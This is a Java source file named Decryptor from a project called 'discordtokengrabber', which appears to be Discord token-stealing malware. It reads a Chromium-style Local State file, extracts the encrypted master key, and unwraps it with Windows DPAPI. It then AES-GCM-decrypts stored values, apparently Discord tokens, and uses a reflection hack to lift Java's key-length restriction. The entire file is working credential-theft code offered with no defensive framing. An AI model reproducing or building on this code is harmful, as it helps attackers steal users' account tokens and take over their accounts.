package com.github.dedinc.discordtokengrabber.utils;

import com.sun.jna.platform.win32.Crypt32Util;
import org.json.JSONObject;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.security.Key;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

public class Decryptor {
    
    public String decrypt(byte[] encryptedData, byte[] key) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            cipher.init(2, (Key)keySpec, spec);
            return new String(cipher.doFinal(payload));
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public byte[] getKey(File path) {
        try {
            JSONObject localStateJson = new JSONObject(new String(Files.readAllBytes(path.toPath())));
            byte[] encryptedKeyBytes = localStateJson.getJSONObject("os_crypt").getString("encrypted_key").getBytes();
            encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);
            encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);
            return Crypt32Util.cryptUnprotectData(encryptedKeyBytes);
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public void bypassKeyRestriction()
    {
        try {
            if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                Constructor<?> con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissionCollection = con.newInstance();
                Field f = aClass.getDeclaredField("all_allowed");
                f.setAccessible(true);
                f.setBoolean(allPermissionCollection, true);

                aClass = Class.forName("javax.crypto.CryptoPermissions");
                con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissions = con.newInstance();
                f = aClass.getDeclaredField("perms");
                f.setAccessible(true);
                ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                aClass = Class.forName("javax.crypto.JceSecurityManager");
                f = aClass.getDeclaredField("defaultPolicy");
                f.setAccessible(true);
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                f.set(null, allPermissions);
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
